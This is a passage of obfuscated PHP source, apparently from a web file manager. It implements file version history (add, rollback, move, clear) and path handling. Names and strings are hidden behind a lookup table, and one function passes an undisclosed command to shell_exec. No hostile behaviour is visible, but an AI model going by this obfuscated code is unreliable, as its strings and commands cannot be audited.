str_replace(array($‡öœÚÉú[1332]), array($‡öœÚÉú[1333]), $³ı´–í¨); return $³ı´–í¨; } public static function log($Ò“‰ğÇ) { } public static function historyCount($‡öÌĞÀÉ) { $¯Õ—ĞóÙ =& $_SERVER[«òÑğ]; $ö¹Şçìó = array(); $‹•“ÏÖÕ = array(); foreach ($‡öÌĞÀÉ as $ã€¼²—™) { $æî²½Ÿ = get_path_father($ã€¼²—™); if (!$‹•“ÏÖÕ[$æî²½Ÿ]) { $‹•“ÏÖÕ[$æî²½Ÿ] = array(); } $‹•“ÏÖÕ[$æî²½Ÿ][] = get_path_this($ã€¼²—™); } foreach ($‹•“ÏÖÕ as $æî²½Ÿ => $ººäÊƒù) { $¡å—â×¬ = self::parsePath($æî²½Ÿ); if (!$¡å—â×¬) { continue; } foreach ($ººäÊƒù as $®­Ÿ¾ïË) { $ÇŠ¼¡¾Ş = self::listData(rtrim($¡å—â×¬, $¯Õ—ĞóÙ[8]) . $¯Õ—ĞóÙ[8] . $®­Ÿ¾ïË, !1); if ($ÇŠ¼¡¾Ş && $ÇŠ¼¡¾Ş[$¯Õ—ĞóÙ[448]]) { $ö¹Şçìó[rtrim($æî²½Ÿ, $¯Õ—ĞóÙ[8]) . $¯Õ—ĞóÙ[8] . $®­Ÿ¾ïË] = count($ÇŠ¼¡¾Ş[$¯Õ—ĞóÙ[448]]); } } } return $ö¹Şçìó; } public static function add($Ô¤÷ü£¯) { $°Ö®’ë =& $_SERVER[«òÑğ]; $ºë•Ù­Œ = self::listData($Ô¤÷ü£¯); if (!$ºë•Ù­Œ) { return; } $’Üë‚¤Ø = Model($°Ö®’ë[854])->get($°Ö®’ë[1334]); $ºâĞú°µ = intval($GLOBALS[$°Ö®’ë[6]][$°Ö®’ë[92]][$°Ö®’ë[1312]]); $õÓÊÜ±Í = $’Üë‚¤Ø == $°Ö®’ë[1335] ? min(5, $ºâĞú°µ) : $ºâĞú°µ; if ($ºâĞú°µ <= 0) { return; } $¹Â–ÖĞ¬ = IO::info($Ô¤÷ü£¯); $ª½Ã¾İ = $ºë•Ù­Œ[$°Ö®’ë[448]]; if ($¹Â–ÖĞ¬[$°Ö®’ë[79]] == 0) { return; } if ($¹Â–ÖĞ¬[$°Ö®’ë[79]] >= 1024 * 1024 * 500) { return !1; } $¾È£šİí = IO::hashSimple($Ô¤÷ü£¯); if ($ª½Ã¾İ && $ª½Ã¾İ[0][$°Ö®’ë[680]] == $¾È£šİí) { return !0; } if (array_key_exists($°Ö®’ë[236], $¹Â–ÖĞ¬) && !$¹Â–ÖĞ¬[$°Ö®’ë[236]]) { return !1; } $ƒ‘à•÷ = short_id(time()); $ÒâŒ€– = array($°Ö®’ë[478] => $ƒ‘à•÷, $°Ö®’ë[680] => $¾È£šİí, $°Ö®’ë[32] => $¹Â–ÖĞ¬[$°Ö®’ë[32]] . $°Ö®’ë[10] . date($°Ö®’ë[1336]) . rand_string(1), $°Ö®’ë[79] => $¹Â–ÖĞ¬[$°Ö®’ë[79]], $°Ö®’ë[530] => USER_ID, $°Ö®’ë[234] => time(), $°Ö®’ë[1337] => $°Ö®’ë[12]); IO::mkdir($ºë•Ù­Œ[$°Ö®’ë[1338]]); $¦æ˜ù¤Ô = IO::copy($Ô¤÷ü£¯, $ºë•Ù­Œ[$°Ö®’ë[1338]], !1, $ÒâŒ€–[$°Ö®’ë[32]]); if (!$¦æ˜ù¤Ô) { self::clearEmptyFolder($ºë•Ù­Œ[$°Ö®’ë[1338]]); return !1; } array_unshift($ª½Ã¾İ, $ÒâŒ€–); if (count($ª½Ã¾İ) > $õÓÊÜ±Í) { $± ¤²Ëõ = array_slice($ª½Ã¾İ, $õÓÊÜ±Í); foreach ($± ¤²Ëõ as $¬¦ó™—ï) { IO::remove($ºë•Ù­Œ[$°Ö®’ë[1338]] . $¬¦ó™—ï[$°Ö®’ë[32]]); } $ª½Ã¾İ = array_slice($ª½Ã¾İ, 0, $õÓÊÜ±Í); } return self::saveData($ºë•Ù­Œ[$°Ö®’ë[1339]], $ª½Ã¾İ); } public static function remove($›šµ˜»ü, $†„—İì’) { $ì£¥Ë¯¡ =& $_SERVER[«òÑğ]; $š·íÇ–¼ = self::listData($›šµ˜»ü); $½àó¹µŠ = array(); if (!$š·íÇ–¼) { return !1; } foreach ($š·íÇ–¼[$ì£¥Ë¯¡[448]] as $Â¨‘Êó) { if ($Â¨‘Êó[$ì£¥Ë¯¡[478]] == $†„—İì’) { IO::remove($š·íÇ–¼[$ì£¥Ë¯¡[1338]] . $Â¨‘Êó[$ì£¥Ë¯¡[32]]); continue; } $½àó¹µŠ[] = $Â¨‘Êó; } return self::saveData($š·íÇ–¼[$ì£¥Ë¯¡[1339]], $½àó¹µŠ); } public static function clear($¡ªİÌšŒ, $ñ÷©õ¥Ş = true) { $­¥—Ä„‡ =& $_SERVER[«òÑğ]; $çŒ£ğèÏ = self::listData($¡ªİÌšŒ, $ñ÷©õ¥Ş); if (!$çŒ£ğèÏ) { return !1; } foreach ($çŒ£ğèÏ[$­¥—Ä„‡[448]] as $©æõñö‰) { IO::remove($çŒ£ğèÏ[$­¥—Ä„‡[1338]] . $©æõñö‰[$­¥—Ä„‡[32]]); } return self::saveData($çŒ£ğèÏ[$­¥—Ä„‡[1339]], array()); } public static function moveHistory($òøßğ®ü, $‰òú÷× = '', $˜ ¦œ¬¿ = '') { $î£ê¿ÖÂ =& $_SERVER[«òÑğ]; $± ß€Ñº = self::listData($òøßğ®ü, !1); if (!$± ß€Ñº || !$± ß€Ñº[$î£ê¿ÖÂ[448]]) { return !1; } $‡Ó–»™ô = $î£ê¿ÖÂ[1326]; $‰òú÷× = $‰òú÷× ? $‰òú÷× : get_path_this($òøßğ®ü); $˜ ¦œ¬¿ = $˜ ¦œ¬¿ ? $˜ ¦œ¬¿ : $± ß€Ñº[$î£ê¿ÖÂ[1338]]; $ş÷—ıî¡ = substr(get_path_this($± ß€Ñº[$î£ê¿ÖÂ[1339]]), 0, -strlen($‡Ó–»™ô)); foreach ($± ß€Ñº[$î£ê¿ÖÂ[448]] as $¯â¹¨¦ => $ˆåø¶éÍ) { $úº£œ = $‰òú÷× . substr($ˆåø¶éÍ[$î£ê¿ÖÂ[32]], strlen($ş÷—ıî¡)); $¦„¤íÒË = IO::move($± ß€Ñº[$î£ê¿ÖÂ[1338]] . $ˆåø¶éÍ[$î£ê¿ÖÂ[32]], $˜ ¦œ¬¿, !1, $úº£œ); if ($¦„¤íÒË) { $± ß€Ñº[$î£ê¿ÖÂ[448]][$¯â¹¨¦][$î£ê¿ÖÂ[32]] = $úº£œ; } } $± ß€Ñº[$î£ê¿ÖÂ[1339]] = IO::move($± ß€Ñº[$î£ê¿ÖÂ[1339]], $˜ ¦œ¬¿, !1, $‰òú÷× . $‡Ó–»™ô); self::saveData($± ß€Ñº[$î£ê¿ÖÂ[1339]], $± ß€Ñº[$î£ê¿ÖÂ[448]]); self::clearEmptyFolder($± ß€Ñº[$î£ê¿ÖÂ[1338]]); } public static function rollback($¦©¼Ä±ö, $ËÖ‘«¤Ü) { $†¡–ÈÙ› =& $_SERVER[«òÑğ]; $ˆü°ê¼¦ = self::listData($¦©¼Ä±ö); if (!$ˆü°ê¼¦) { return; } $‡ŞÀ™™² = IO::info($¦©¼Ä±ö); foreach ($ˆü°ê¼¦[$†¡–ÈÙ›[448]] as $‘áÉ£Öœ => $ÛáÔÑÕò) { if ($ÛáÔÑÕò[$†¡–ÈÙ›[478]] == $ËÖ‘«¤Ü) { self::add($¦©¼Ä±ö); $ÍœôÑ½Ù = $ˆü°ê¼¦[$†¡–ÈÙ›[1338]] . $ÛáÔÑÕò[$†¡–ÈÙ›[32]]; $‘Ñ¨£µé = IO::copy($ÍœôÑ½Ù, IO::pathFather($¦©¼Ä±ö), REPEAT_REPLACE, $‡ŞÀ™™²[$†¡–ÈÙ›[32]]); if ($‘Ñ¨£µé) { self::remove($¦©¼Ä±ö, $ËÖ‘«¤Ü); } return $‘Ñ¨£µé; } } return !1; } public static function setDetail($¾ÅÑÏØ, $ğÃÏ­Î, $ÊÕ³š™´) { $¡•Şäò– =& $_SERVER[«òÑğ]; $¾Ù¬˜ü‹ = self::listData($¾ÅÑÏØ); if (!$¾Ù¬˜ü‹) { return; } foreach ($¾Ù¬˜ü‹[$¡•Şäò–[448]] as $ÏşˆÄ´ => $›‡ªµ•) { if ($›‡ªµ•[$¡•Şäò–[478]] == $ğÃÏ­Î) { $¾Ù¬˜ü‹[$¡•Şäò–[448]][$ÏşˆÄ´][$¡•Şäò–[1337]] = $ÊÕ³š™´; self::saveData($¾Ù¬˜ü‹[$¡•Şäò–[1339]], $¾Ù¬˜ü‹[$¡•Şäò–[448]]); return !0; } } return !1; } public static function fileInfo($Ã·…Àé, $¹©ù„­®) { $¸ùÉíÎ =& $_SERVER[«òÑğ]; $³ÜİÍÍ = self::listData($Ã·…Àé); if (!$³ÜİÍÍ) { show_json(LNG($¸ùÉíÎ[108]), !1); } $·ØÂ‚ù‘ = $¸ùÉíÎ[12]; foreach ($³ÜİÍÍ[$¸ùÉíÎ[448]] as $¨Ê˜Ô° => $‘ÊÖÊ§) { if ($‘ÊÖÊ§[$¸ùÉíÎ[478]] != $¹©ù„­®) { continue; } $·ØÂ‚ù‘ = $³ÜİÍÍ[$¸ùÉíÎ[1338]] . $‘ÊÖÊ§[$¸ùÉíÎ[32]]; break; } if (!$·ØÂ‚ù‘) { show_json(LNG($¸ùÉíÎ[108]), !1); } return IO::info($·ØÂ‚ù‘); } public static function fileOut($¼È¶À, $®†‹¬Âş, $Îëš¢Š = false) { $ñÀø—ÛÍ =& $_SERVER[«òÑğ]; $ğış¨à¶ = self::fileInfo($¼È¶À, $®†‹¬Âş); $ïËÉœ« =& $GLOBALS[$ñÀø—ÛÍ[7]]; $Îëš¢Š = isset($ïËÉœ«[$ñÀø—ÛÍ[1289]]) && $ïËÉœ«[$ñÀø—ÛÍ[1289]] == 1; if (isset($ïËÉœ«[$ñÀø—ÛÍ[33]]) && $ïËÉœ«[$ñÀø—ÛÍ[33]] == $ñÀø—ÛÍ[1340]) { return IO::fileOutImage($ğış¨à¶[$ñÀø—ÛÍ[87]], $ïËÉœ«[$ñÀø—ÛÍ[1341]]); } IO::fileOut($ğış¨à¶[$ñÀø—ÛÍ[87]], $Îëš¢Š, get_path_this($¼È¶À)); } public static function listData($«˜Òõ‘­, $·•ˆñŠ– = true) { $‰¨öê¼´ =& $_SERVER[«òÑğ]; if ($·•ˆñŠ– && !IO::exist($«˜Òõ‘­)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($«˜Òõ‘­, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ëûš§™Ø = self::pathHistory($«˜Òõ‘­); $®š“·ùÀ = array($‰¨öê¼´[1339] => $Ëûš§™Ø . $‰¨öê¼´[1326], $‰¨öê¼´[1338] => rtrim(get_path_father($Ëûš§™Ø), $‰¨öê¼´[8]) . $‰¨öê¼´[8], $‰¨öê¼´[448] => array()); $ÚûóÃ” = IO::getContent($®š“·ùÀ[$‰¨öê¼´[1339]]); if ($ÚûóÃ”) { $Ğ ¦ó§· = json_decode($ÚûóÃ”, !0); if (is_array($Ğ ¦ó§·)) { $®š“·ùÀ[$‰¨öê¼´[448]] = $Ğ ¦ó§·; } } return $®š“·ùÀ; } private static function saveData($ñºœîÃÁ, $Ã„õ’Â„) { $æÁÅ¼‡ö =& $_SERVER[«òÑğ]; self::log($æÁÅ¼‡ö[1342] . $ñºœîÃÁ . $æÁÅ¼‡ö[74] . count($Ã„õ’Â„), $æÁÅ¼‡ö[836]); if ($Ã„õ’Â„) { return IO::setContent($ñºœîÃÁ, json_encode($Ã„õ’Â„)); } $¶›±‚”ö = IO::pathFather($ñºœîÃÁ); IO::remove($ñºœîÃÁ); self::clearEmptyFolder($¶›±‚”ö); return !0; } public static function clearEmptyFolder($£Ø§‘Îª) { $’¹àæˆ =& $_SERVER[«òÑğ]; if (trim($£Ø§‘Îª, $’¹àæˆ[8]) == trim(self::$_historyBase, $’¹àæˆ[8])) { return; } $Ô½²“ö = IO::pathFather($£Ø§‘Îª); $‰ê°ØÑ› = IO::has($£Ø§‘Îª, !0); if ($‰ê°ØÑ›[$’¹àæˆ[242]] > 0 || $‰ê°ØÑ›[$’¹àæˆ[243]] > 0) { return; } IO::remove($£Ø§‘Îª); self::clearEmptyFolder($Ô½²“ö); } private static function getBasePath() { $šô¥³±è =& $_SERVER[«òÑğ]; $·ê’”Š = Model($šô¥³±è[1343])->get($šô¥³±è[1344]); if ($·ê’”Š) { if (!IO::exist($·ê’”Š)) { IO::mkdir($·ê’”Š); } if (get_path_this($·ê’”Š) == $šô¥³±è[1329]) { $Á¿‘ôÑ = $šô¥³±è[1345] . rand_string(8); @rename($·ê’”Š, get_path_father($·ê’”Š) . $šô¥³±è[8] . $Á¿‘ôÑ); $·ê’”Š = DATA_PATH . $Á¿‘ôÑ . $šô¥³±è[8]; file_put_contents(DATA_PATH . $šô¥³±è[1276], $šô¥³±è[12]); Model($šô¥³±è[1343])->set($šô¥³±è[1344], $·ê’”Š); } return $·ê’”Š; } $·ê’”Š = DATA_PATH . $šô¥³±è[1345] . rand_string(8) . $šô¥³±è[8]; $·ê’”Š = IO::mkdir($·ê’”Š); $·ê’”Š = rtrim($·ê’”Š, $šô¥³±è[8]) . $šô¥³±è[8]; file_put_contents($·ê’”Š . $šô¥³±è[1276], $šô¥³±è[12]); file_put_contents(DATA_PATH . $šô¥³±è[1276], $šô¥³±è[12]); Model($šô¥³±è[1343])->set($šô¥³±è[1344], $·ê’”Š); return $·ê’”Š; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\x52\x65\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\106\151\154\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\106\x69\x6c\x65\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\x70\x52\x6f\x6f\x74\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\123\150\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\162\123\x68\x61\162\145\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\145\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\x65\x49\x74\x65\155\114\151\156\x6b\x7d"; const KOD_SEARCH = "\173\163\145\x61\162\143\150\x7d"; const KOD_BLOCK = "\173\x62\154\157\143\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\x65\162\x52\x65\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\x65\x72\175"; public static function typeList() { $‡Ä·–±¹ =& $_SERVER[«òÑğ]; return array($‡Ä·–±¹[1346] => self::KOD_SOURCE, $‡Ä·–±¹[1347] => self::KOD_USER_RECYCLE, $‡Ä·–±¹[1348] => self::KOD_USER_FAV, $‡Ä·–±¹[1349] => self::KOD_USER_FILE_TAG, $‡Ä·–±¹[1350] => self::KOD_USER_FILE_TYPE, $‡Ä·–±¹[1351] => self::KOD_GROUP_ROOT_SELF, $‡Ä·–±¹[1352] => self::KOD_USER_SHARE, $‡Ä·–±¹[1353] => self::KOD_USER_SHARE_LINK, $‡Ä·–±¹[1354] => self::KOD_USER_SHARE_TO_ME, $‡Ä·–±¹[1355] => self::KOD_SHARE_ITEM, $‡Ä·–±¹[1356] => self::KOD_SHARE_LINK, $‡Ä·–±¹[1357] => self::KOD_SEARCH, $‡Ä·–±¹[1358] => self::KOD_BLOCK, $‡Ä·–±¹[1359] => self::KOD_IO, $‡Ä·–±¹[1360] => self::KOD_USER_RECENT, $‡Ä·–±¹[1361] => self::KOD_USER_DRIVER); } public static function parse($òêï§š) { $æÙ³â =& $_SERVER[«òÑğ]; $òêï§š = self::clear($òêï§š); $œÒªÊ­å = array_values(self::typeList()); preg_match($æÙ³â[1362], $òêï§š, $¨óŸ ¶¼); $´„•¼Öî = array($æÙ³â[499] => !1, $æÙ³â[1363] => !1, $æÙ³â[496] => !1, $æÙ³â[87] => $òêï§š, $æÙ³â[1261] => !1, $æÙ³â[1260] => $æÙ³â[12]); if (is_array($¨óŸ ¶¼) && count($¨óŸ ¶¼) == 5) { $îõåÈğç = $æÙ³â[1364] . $¨óŸ ¶¼[2] . $æÙ³â[405]; if (in_array($îõåÈğç, $œÒªÊ­å)) { $´„•¼Öî[$æÙ³â[1261]] = $¨óŸ ¶¼[1]; $´„•¼Öî[$æÙ³â[33]] = $îõåÈğç; $´„•¼Öî[$æÙ³â[1365]] = substr($îõåÈğç, 1, -1); $´„•¼Öî[$æÙ³â[478]] = $¨óŸ ¶¼[3]; } $´„•¼Öî[$æÙ³â[1260]] = $¨óŸ ¶¼[4]; } $–Ğ—ïó„ = array($æÙ³â[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $´„•¼Öî[$æÙ³â[1328]] = in_array($´„•¼Öî[$æÙ³â[33]], $–Ğ—ïó„); return $´„•¼Öî; } public static function isTruePath($î÷ºò ) { $™üÀ«ı• =& $_SERVER[«òÑğ]; if (substr($î÷ºò , 0, 1) != $™üÀ«ı•[1364]) { return !0; } if (strpos($î÷ºò , $™üÀ«ı•[486]) === 0) { return !0; } if (strpos($î÷ºò , $™üÀ«ı•[1332]) === 0) { return !0; } if (strpos($î÷ºò , $™üÀ«ı•[1366]) === 0) { return !0; } if (strpos($î÷ºò , $™üÀ«ı•[1367]) === 0) { return !0; } if (strpos($î÷ºò , $™üÀ«ı•[1368]) === 0) { return !0; } return !1; } public static function clear($ÈÁŒİûÑ) { $Ù¢üÂäı =& $_SERVER[«òÑğ]; $ÈÁŒİûÑ = str_replace(array($Ù¢üÂäı[1166], $Ù¢üÂäı[288]), $Ù¢üÂäı[53], $ÈÁŒİûÑ); $ÈÁŒİûÑ = str_replace($Ù¢üÂäı[100], $Ù¢üÂäı[8], $ÈÁŒİûÑ); $ú®¼úÀ¢ = $Ù¢üÂäı[1369]; if (substr($ÈÁŒİûÑ, 0, 3) == $Ù¢üÂäı[1370]) { $ÈÁŒİûÑ = substr($ÈÁŒİûÑ, 3); } while (strstr($ÈÁŒİûÑ, $ú®¼úÀ¢)) { $ÈÁŒİûÑ = str_replace($ú®¼úÀ¢, $Ù¢üÂäı[8], $ÈÁŒİûÑ); } $ÈÁŒİûÑ = preg_replace($Ù¢üÂäı[1371], $Ù¢üÂäı[8], $ÈÁŒİûÑ); if ($ÈÁŒİûÑ == $Ù¢üÂäı[8]) { return $Ù¢üÂäı[8]; } $ÈÁŒİûÑ = rtrim($ÈÁŒİûÑ, $Ù¢üÂäı[8]); return $ÈÁŒİûÑ; } public static function pathTrue($è”İ›—‹) { $¢œÓ¾¶ =& $_SERVER[«òÑğ]; if (!$è”İ›—‹) { return $¢œÓ¾¶[12]; } $è”İ›—‹ = str_replace($¢œÓ¾¶[257], $¢œÓ¾¶[8], str_replace($¢œÓ¾¶[1372], $¢œÓ¾¶[8], $è”İ›—‹)); $è”İ›—‹ = str_replace($¢œÓ¾¶[257], $¢œÓ¾¶[8], str_replace($¢œÓ¾¶[1372], $¢œÓ¾¶[8], $è”İ›—‹)); if (!strstr($è”İ›—‹, $¢œÓ¾¶[1370])) { return $è”İ›—‹; } $Ë¤–É» = explode($¢œÓ¾¶[8], $è”İ›—‹); foreach ($Ë¤–É» as $Îú£“íĞ => $ƒù¡çÈû) { if ($ƒù¡çÈû !== $¢œÓ¾¶[1373]) { continue; } for ($Ş¹Àïê¬ = $Îú£“íĞ; $Ş¹Àïê¬ >= 0; $Ş¹Àïê¬--) { if ($Ë¤–É»[$Ş¹Àïê¬] === $¢œÓ¾¶[10] || $Ë¤–É»[$Ş¹Àïê¬] === $¢œÓ¾¶[1373] || $Ë¤–É»[$Ş¹Àïê¬] === -1) { continue; } if ($Ë¤–É»[$Ş¹Àïê¬] === $¢œÓ¾¶[12]) { $Ë¤–É»[$Îú£“íĞ] = -1; break; } $Ë¤–É»[$Îú£“íĞ] = -1; $Ë¤–É»[$Ş¹Àïê¬] = -1; break; } } $²†æç¦Ë = array(); foreach ($Ë¤–É» as $ƒù¡çÈû) { if ($ƒù¡çÈû !== -1) { $²†æç¦Ë[] = $ƒù¡çÈû; } } $å×ÅŞ™¡ = implode($¢œÓ¾¶[8], $²†æç¦Ë); if (strpos($å×ÅŞ™¡, $¢œÓ¾¶[1374]) === 0) { $å×ÅŞ™¡ = $¢œÓ¾¶[1370] . substr($å×ÅŞ™¡, strlen($¢œÓ¾¶[1374])); } return $å×ÅŞ™¡; } public static function pathUrlClear($ë²Û‘) { $åé‡Œâ½ =& $_SERVER[«òÑğ]; if (!$ë²Û‘) { return $ë²Û‘; } $ë²Û‘ = rawurldecode($ë²Û‘); $ë²Û‘ = str_replace($åé‡Œâ½[1372], $åé‡Œâ½[8], $ë²Û‘); if (strpos($ë²Û‘, $åé‡Œâ½[76]) > 0) { $ë²Û‘ = substr($ë²Û‘, 0, strpos($ë²Û‘, $åé‡Œâ½[76])); } if (strpos($ë²Û‘, $åé‡Œâ½[1375]) > 0) { $ë²Û‘ = substr($ë²Û‘, 0, strpos($ë²Û‘, $åé‡Œâ½[1375])); } return $ë²Û‘; } public static function sourceID($â£à‚¸) { $ª¤Ó‘© =& $_SERVER[«òÑğ]; $ÛˆãÙª¥ = self::parse($â£à‚¸); if ($ÛˆãÙª¥[$ª¤Ó‘©[33]] !== self::KOD_SOURCE) { show_json(LNG($ª¤Ó‘©[1376]), !1); } return $ÛˆãÙª¥[$ª¤Ó‘©[478]]; } public static function make($Éè‘âÜ°) { if (!$Éè‘âÜ°) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Éè‘âÜ°)); } public static function makeShare($µÆ…Ÿ¤, $îÎ² ŠÂ) { return self::makePath(self::KOD_SHARE_ITEM, $µÆ…Ÿ¤, $îÎ² ŠÂ); } public static function makeFileTypePath($Œ÷ë­¢ƒ) { return self::makePath(self::KOD_USER_FILE_TYPE, $Œ÷ë­¢ƒ); } public static function makeFileTagPath($Ş«ıµ›ã) { return self::makePath(self::KOD_USER_FILE_TAG, $Ş«ıµ›ã); } public static function makePath($ïıò­ûá, $À¬šªºÃ = '', $Ø¹Ú–‘ = '') { $ìæë§Øö =& $_SERVER[«òÑğ]; $ßÁòª« = substr($ïıò­ûá, 1, -1); $™á—Ï” = $ìæë§Øö[1377] . $ßÁòª« . $ìæë§Øö[1378] . $À¬šªºÃ . $ìæë§Øö[1379]; $™á—Ï” = $Ø¹Ú–‘ ? $™á—Ï” . $Ø¹Ú–‘ . $ìæë§Øö[8] : $™á—Ï”; return $™á—Ï”; } public static function hashPath($˜ÂœñÍò, $›ÛÇø¯è = true) { $’æÙØÆÉ =& $_SERVER[«òÑğ]; $üŒàáîŞ = is_array($˜ÂœñÍò) ? $˜ÂœñÍò : IO::info($˜ÂœñÍò); $ŒÃØÒÂ¨ = _get($üŒàáîŞ, $’æÙØÆÉ[1380], $’æÙØÆÉ[12]); if (!$ŒÃØÒÂ¨ && isset($üŒàáîŞ[$’æÙØÆÉ[238]])) { $ŒÃØÒÂ¨ = trim($üŒàáîŞ[$’æÙØÆÉ[238]], $’æÙØÆÉ[121]); } if (!$ŒÃØÒÂ¨ && isset($üŒàáîŞ[$’æÙØÆÉ[194]]) && $üŒàáîŞ[$’æÙØÆÉ[194]]) { $üŒàáîŞ = IO::info(KodIO::make($üŒàáîŞ[$’æÙØÆÉ[194]])); $ŒÃØÒÂ¨ = _get($üŒàáîŞ, $’æÙØÆÉ[1380], $’æÙØÆÉ[12]); } $—åœ±Î = md5($üŒàáîŞ[$’æÙØÆÉ[87]] . $üŒàáîŞ[$’æÙØÆÉ[79]] . $üŒàáîŞ[$’æÙØÆÉ[88]]); if (!$ŒÃØÒÂ¨ && file_exists($üŒàáîŞ[$’æÙØÆÉ[87]])) { $ŒÃØÒÂ¨ = Cache::get($—åœ±Î . $’æÙØÆÉ[1381]); $ŒÃØÒÂ¨ = !1; if (!$ŒÃØÒÂ¨) { $ŒÃØÒÂ¨ = IO::hashSimple($üŒàáîŞ[$’æÙØÆÉ[87]]); Cache::set($—åœ±Î . $’æÙØÆÉ[1381], $ŒÃØÒÂ¨, 3600 * 24 * 30); } } if ($›ÛÇø¯è && !$ŒÃØÒÂ¨) { } return $ŒÃØÒÂ¨ ? $ŒÃØÒÂ¨ : $—åœ±Î; } public static function hashPathSafe($ûà¸«¡, $ò£’óì¶ = true) { $‘Áğ¿–â =& $_SERVER[«òÑğ]; $ş°§Ë†ò = self::hashPath($ûà¸«¡, $ò£’óì¶); return md5($ş°§Ë†ò . $‘Áğ¿–â[1382] . Model($‘Áğ¿–â[854])->get($‘Áğ¿–â[855])); } public static function initSystemPath() { $¦†æß²Ä =& $_SERVER[«òÑğ]; if (defined($¦†æß²Ä[1383])) { return; } define($¦†æß²Ä[1383], self::systemPath($¦†æß²Ä[192])); define($¦†æß²Ä[1384], self::systemPath($¦†æß²Ä[1385])); define($¦†æß²Ä[1386], self::systemPath($¦†æß²Ä[1387])); define($¦†æß²Ä[1388], self::systemPath($¦†æß²Ä[1389])); IOHistory::bindEvent(); } public static function systemPath($™ş—áË) { $¸ñÃò‡ù =& $_SERVER[«òÑğ]; $ éÙŞ”Ğ = $¸ñÃò‡ù[1390] . ucfirst($™ş—áË); $¡Ïì¬° = Model($¸ñÃò‡ù[854])->get($ éÙŞ”Ğ); if ($¡Ïì¬°) { return $¡Ïì¬°; } if ($™ş—áË == $¸ñÃò‡ù[192]) { $¡Ïì¬° = self::make(Model($¸ñÃò‡ù[914])->systemRootPathAdd($¸ñÃò‡ù[613])); } else { $¡Ïì¬° = self::systemPath($¸ñÃò‡ù[192]); $‚ÎÕ›Ç› = self::sourceID($¡Ïì¬°); $¡Ïì¬° = self::make(Model($¸ñÃò‡ù[914])->mkdir($‚ÎÕ›Ç›, $™ş—áË)); } Model($¸ñÃò‡ù[854])->set($ éÙŞ”Ğ, $¡Ïì¬°); return $¡Ïì¬°; } public static function systemFolder($À³åÖÀ¾) { $õ±ùÃ = IO_PATH_SYSTEM_SOURCE . $À³åÖÀ¾; $çıÀè¦¢ = Cache::get($õ±ùÃ); if (!$çıÀè¦¢) { $óÁ¦šå‘ = IO::infoFullSimple($õ±ùÃ); if (!$óÁ¦šå‘) { $çıÀè¦¢ = IO::mkdir($õ±ùÃ, REPEAT_SKIP); } else { $çıÀè¦¢ = $óÁ¦šå‘[$_SERVER[«òÑğ][87]]; } Cache::set($õ±ùÃ, $çıÀè¦¢, 3600 * 10); } return $çıÀè¦¢; } public static function defaultDriver() { return Model($_SERVER[«òÑğ][851])->defaultDriver(); } public static function defaultIO() { $ïà²ÛÄæ =& $_SERVER[«òÑğ]; $òÑ…ñâ¼ = self::defaultDriver(); return $ïà²ÛÄæ[1391] . $òÑ…ñâ¼[$ïà²ÛÄæ[478]] . $ïà²ÛÄæ[1379]; } public static function defaultDriverInit() { static $îÑæ¨À = false; if ($îÑæ¨À) { return $îÑæ¨À; } $îÑæ¨À = IO::init(self::defaultIO()); return $îÑæ¨À; } public static function fileTypeList() { $Ì°¤Ùı‚ =& $_SERVER[«òÑğ]; $ˆ³Ñíú = $GLOBALS[$Ì°¤Ùı‚[6]][$Ì°¤Ùı‚[1392]]; foreach ($ˆ³Ñíú as $Û¢»ø£ø => $¿¥³à‘ä) { $æåŸÜìı = $Ì°¤Ùı‚[1393] . $Û¢»ø£ø; $·¸ïí“ã = LNG($æåŸÜìı); if ($æåŸÜìı != $·¸ïí“ã) { $ˆ³Ñíú[$Û¢»ø£ø][$Ì°¤Ùı‚[32]] = $·¸ïí“ã; } } return $ˆ³Ñíú; } public static function diskList($×¬¾ç¡Ä = true) { $±ÔÊÊ“õ = $_SERVER[«òÑğ][1394]; if ($×¬¾ç¡Ä) { $¢È¹Êç¥ = Cache::get($±ÔÊÊ“õ); if (is_array($¢È¹Êç¥)) { return $¢È¹Êç¥; } } $¢È¹Êç¥ = self::diskListGet(); Cache::set($±ÔÊÊ“õ, $¢È¹Êç¥, 60); return $¢È¹Êç¥; } public static function diskListGet() { $œ‡“¦º‹ =& $_SERVER[«òÑğ]; $¸ï¥ñ¥ù = array(); if ($GLOBALS[$œ‡“¦º‹[6]][$œ‡“¦º‹[1395]] == $œ‡“¦º‹[1396]) { $ÂÔé²Ûâ = $œ‡“¦º‹[1397]; for ($Óú¡ø¥ = 0; $Óú¡ø¥ < strlen($ÂÔé²Ûâ); $Óú¡ø¥++) { $æê’¢ œ = $ÂÔé²Ûâ[$Óú¡ø¥] . $œ‡“¦º‹[1398]; if (file_exists($æê’¢ œ)) { $¸ï¥ñ¥ù[] = $æê’¢ œ; } } return $¸ï¥ñ¥ù; } if (!function_exists($œ‡“¦º‹[101])) { $¸ï¥ñ¥ù[] = $œ‡“¦º‹[925]; return $¸ï¥ñ¥ù; } $ßÕ•š¸ = explode($œ‡“¦º‹[288], shell_exec($œ‡“¦º‹[1399])); array_shift($ßÕ•š¸); array_pop($ßÕ•š¸); $ëè£äƒ› = array($œ‡“¦º‹[1400], $œ‡“¦º‹[1401], $œ‡“¦º‹[1402], $œ‡“¦º‹[1403], 